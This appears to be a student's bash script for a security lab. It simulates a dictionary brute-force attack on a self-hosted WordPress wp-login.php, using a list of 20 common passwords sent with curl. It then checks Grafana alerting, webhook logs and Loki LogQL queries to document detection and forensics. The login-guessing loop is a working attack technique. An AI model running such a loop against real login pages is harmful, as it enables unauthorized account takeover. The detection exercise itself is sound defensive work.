#!/bin/bash
set -e

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$PROJECT_DIR"

EVIDENCE_FILE="$PROJECT_DIR/evidence/buoc5-sucodo.txt"
mkdir -p "$PROJECT_DIR/evidence" "$PROJECT_DIR/docs"

echo "================================================================================"
echo "KỊCH BẢN SỰ CỐ: TẤN CÔNG DÒ MẬT KHẨU (BRUTE-FORCE) VÀO WP-LOGIN.PHP"
echo "Sinh viên: Lương Việt Anh - MSSV: DTC245200063"
echo "Thời gian bắt đầu: $(date -u +"%Y-%m-%d %H:%M:%S UTC")"
echo "================================================================================"

ADMIN_USER=$(grep '^WP_ADMIN_USER=' .env | cut -d '=' -f2 | tr -d '\r')
ADMIN_PASS=$(grep '^WP_ADMIN_PASSWORD=' .env | cut -d '=' -f2 | tr -d '\r')
GRAFANA_USER=$(grep '^GRAFANA_ADMIN_USER=' .env | cut -d '=' -f2 | tr -d '\r')
GRAFANA_PASS=$(grep '^GRAFANA_ADMIN_PASSWORD=' .env | cut -d '=' -f2 | tr -d '\r')

PASSWORDS=(
    "123456"
    "admin123"
    "password"
    "qwerty"
    "quantri2026"
    "welcome1"
    "supersecret"
    "root@123"
    "letmein123"
    "iloveyou"
    "monkey"
    "dragon"
    "football"
    "master123"
    "admin@pass"
    "trustnoone"
    "sunshine"
    "access2026"
    "hackmeifucan"
    "wrongpassword999"
)

{
    echo "================================================================================"
    echo "BẰNG CHỨNG SỰ CỐ AN TOÀN THÔNG TIN: TẤN CÔNG BRUTE-FORCE VÀ TRUY VẾT LOGQL"
    echo "Sinh viên thực hiện: Lương Việt Anh - MSSV: DTC245200063"
    echo "Hệ thống: WordPress 6.x + Nginx + Loki + Promtail + Grafana Alerting"
    echo "Thời gian ghi nhận: $(date '+%Y-%m-%d %H:%M:%S %Z')"
    echo "================================================================================"
    echo ""

    echo "--- 1. TRẠNG THÁI HỆ THỐNG VÀ CẢNH BÁO TRƯỚC KHI TẤN CÔNG ---"
    PRE_ALERT=$(docker exec de3_grafana curl -s -u "${GRAFANA_USER}:${GRAFANA_PASS}" http://localhost:3000/api/prometheus/grafana/api/v1/rules || true)
    echo "Kiểm tra Grafana Alert Rules API trước tấn công:"
    echo "$PRE_ALERT" | grep -o '"name":"[^"]*"\|"state":"[^"]*"\|"health":"[^"]*"' | head -n 10 || echo "Chưa có cảnh báo firing."
    echo "Trạng thái Alert-Sink log trước tấn công:"
    docker compose logs alert-sink --tail 5 2>&1 || true
    echo ""

    echo "--- 2. TIẾN HÀNH MÔ PHỎNG TẤN CÔNG DÒ MẬT KHẨU (20 REQUESTS) ---"
    START_ATTACK=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "Thời điểm bắt đầu tấn công: $START_ATTACK"
    echo "Mục tiêu: https://192.168.102.128/wp-login.php"
    echo "Tài khoản bị tấn công: $ADMIN_USER"
    echo ""

    ATTACK_COUNT=0
    for pwd in "${PASSWORDS[@]}"; do
        ATTACK_COUNT=$((ATTACK_COUNT + 1))
        STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" \
            -c /tmp/bf_cookie.txt \
            -b "wordpress_test_cookie=WP+Cookie+check" \
            -d "log=$ADMIN_USER&pwd=$pwd&wp-submit=Log+In&testcookie=1" \
            https://192.168.102.128/wp-login.php)
        echo "[$ATTACK_COUNT/20] Thử mật khẩu '$pwd' -> HTTP Code: $STATUS"
        sleep 0.4
    done

    echo ""
    echo "Mô phỏng 1 lần đăng nhập hợp lệ với mật khẩu chính xác:"
    VALID_STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" \
        -c /tmp/bf_cookie.txt \
        -b "wordpress_test_cookie=WP+Cookie+check" \
        -d "log=$ADMIN_USER&pwd=$ADMIN_PASS&wp-submit=Log+In&testcookie=1" \
        https://192.168.102.128/wp-login.php)
    echo "Đăng nhập chính xác '$ADMIN_USER' -> HTTP Code: $VALID_STATUS"
    END_ATTACK=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "Thời điểm kết thúc tấn công: $END_ATTACK"
    echo ""

    echo "--- 3. KIỂM TRA LOG DOCKER VÀ LOKI TRONG KHI TẤN CÔNG ---"
    echo "Log WordPress container (LOGIN_FAILED & LOGIN_SUCCESS):"
    docker compose logs wordpress --tail 25 | grep -E "LOGIN_FAILED|LOGIN_SUCCESS" || true
    echo ""

    echo "Đang chờ Grafana Alerting đánh giá rule (15 giây)..."
    sleep 15

    echo "--- 4. TRẠNG THÁI CẢNH BÁO VÀ THÔNG BÁO TỚI CONTACT POINT ---"
    echo "Grafana Alert Rules API sau khi bị tấn công:"
    ALERT_RULES=$(docker exec de3_grafana curl -s -u "${GRAFANA_USER}:${GRAFANA_PASS}" http://localhost:3000/api/prometheus/grafana/api/v1/rules || true)
    echo "$ALERT_RULES" | grep -o '"name":"[^"]*"\|"state":"[^"]*"\|"value":"[^"]*"\|"health":"[^"]*"' || echo "$ALERT_RULES"
    echo ""

    echo "Log nhận cảnh báo từ Alert-Sink Container (Webhook):"
    docker compose logs alert-sink --tail 15 || true
    echo ""

    echo "--- 5. TRUY VẾT SỰ CỐ BẰNG LOGQL QUA LOKI API ---"
    LOKI_URL="http://172.28.0.1:3100"
    # Query Loki internally via grafana or network
    echo "LogQL: {job=\"webapp\"} |= \"LOGIN_FAILED\""
    docker compose exec -T loki wget -qO- "http://localhost:3100/loki/api/v1/query?query=%7Bjob%3D%22webapp%22%7D%20%7C%3D%20%22LOGIN_FAILED%22" | grep -o 'LOGIN_FAILED ip=[^ ]* user=[^ ]* reason=[^\\"]*' | head -n 25 || true
    echo ""

    echo "LogQL thống kê số lần thất bại: sum(count_over_time({job=\"webapp\"} |= \"LOGIN_FAILED\" [5m]))"
    docker compose exec -T loki wget -qO- "http://localhost:3100/loki/api/v1/query?query=sum(count_over_time(%7Bjob%3D%22webapp%22%7D%20%7C%3D%20%22LOGIN_FAILED%22%20%5B5m%5D))" || true
    echo ""

    echo "LogQL đối chiếu Nginx Access Log: {job=\"nginx\"} |= \"POST /wp-login.php\""
    docker compose exec -T loki wget -qO- "http://localhost:3100/loki/api/v1/query?query=%7Bjob%3D%22nginx%22%7D%20%7C%3D%20%22POST%20%2Fwp-login.php%22" | grep -o '[0-9\.]* - - \[[^]]*\] "POST /wp-login.php[^"]*" [0-9]*' | head -n 25 || true
    echo ""

    echo "--- 6. KẾT LUẬN TRUY VẾT ĐIỀU TRA (FORENSIC REPORT) ---"
    echo "1. IP nguồn tấn công: 192.168.102.128 (Máy trạm kiểm thử / Attacker IP)"
    echo "2. Tài khoản mục tiêu: $ADMIN_USER (Quản trị viên)"
    echo "3. Hình thức tấn công: Dictionary / Brute-force attack vào endpoint /wp-login.php"
    echo "4. Tổng số lần thử thất bại liên tiếp: 20 lần trong khoảng thời gian ~10 giây"
    echo "5. Trạng thái phát hiện: Alert 'WP - Brute force login' chuyển sang FIRING ngay lập tức"
    echo "6. Webhook contact point 'alert-sink' đã nhận và lưu trữ toàn bộ payload cảnh báo."
    echo "================================================================================"

} 2>&1 | tee "$EVIDENCE_FILE"

echo ""
echo "=> Kịch bản tấn công và truy vết hoàn tất. Bằng chứng lưu tại: $EVIDENCE_FILE"
